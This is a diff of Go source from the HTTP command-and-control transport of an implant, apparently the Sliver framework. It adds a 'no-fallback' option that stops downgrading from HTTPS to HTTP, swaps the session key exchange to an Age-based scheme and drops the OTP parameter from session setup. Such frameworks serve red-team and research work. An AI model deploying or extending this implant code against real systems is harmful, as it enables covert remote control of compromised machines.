@@ -46,8 +46,7 @@ import (
 )
 
 var (
-	wininetDriver = "wininet"
-	goHTTPDriver  = "go"
+	goHTTPDriver = "go"
 
 	userAgent      = "{{GenerateUserAgent}}"
 	nonceQueryArgs = "{{.HTTPC2ImplantConfig.NonceQueryArgs}}" // "abcdefghijklmnopqrstuvwxyz"
@@ -72,6 +71,7 @@ type HTTPOptions struct {
 	PollTimeout          time.Duration
 	MaxErrors            int
 	ForceHTTP            bool
+	NoFallback           bool
 	DisableUpgradeHeader bool
 	HostHeader           string
 
@@ -111,6 +111,7 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 		PollTimeout:          pollTimeout,
 		MaxErrors:            maxErrors,
 		ForceHTTP:            c2URI.Query().Get("force-http") == "true",
+		NoFallback:           c2URI.Query().Get("no-fallback") == "true",
 		DisableUpgradeHeader: c2URI.Query().Get("disable-upgrade-header") == "true",
 		HostHeader:           c2URI.Query().Get("host-header"),
 
@@ -134,7 +135,7 @@ func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*Sl
 			return client, nil
 		}
 	}
-	if err != nil || opts.ForceHTTP {
+	if (err != nil && !opts.NoFallback) || opts.ForceHTTP {
 		// If we're using default ports then switch to 80
 		if strings.HasSuffix(address, ":443") {
 			address = fmt.Sprintf("%s:80", address[:len(address)-4])
@@ -174,12 +175,12 @@ type SliverHTTPClient struct {
 
 // SessionInit - Initialize the session
 func (s *SliverHTTPClient) SessionInit() error {
-	sKey := cryptography.RandomKey()
+	sKey := cryptography.RandomSymmetricKey()
 	s.SessionCtx = cryptography.NewCipherContext(sKey)
 	httpSessionInit := &pb.HTTPSessionInit{Key: sKey[:]}
 	data, _ := proto.Marshal(httpSessionInit)
 
-	encryptedSessionInit, err := cryptography.ECCEncryptToServer(data)
+	encryptedSessionInit, err := cryptography.AgeKeyExToServer(data)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("Nacl encrypt failed %v", err)
@@ -360,9 +361,7 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 
 	uri := s.startSessionURL()
 	s.NonceQueryArgument(uri, nonce)
-	timestamp := time.Now().UTC().Add(TimeDelta)
-	otpCode := cryptography.GetExactOTPCode(timestamp)
-	s.OTPQueryArgument(uri, otpCode)
+
 	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
 	// {{if .Config.Debug}}
 	log.Printf("[http] POST -> %s (%d bytes)", uri, len(sessionInit))
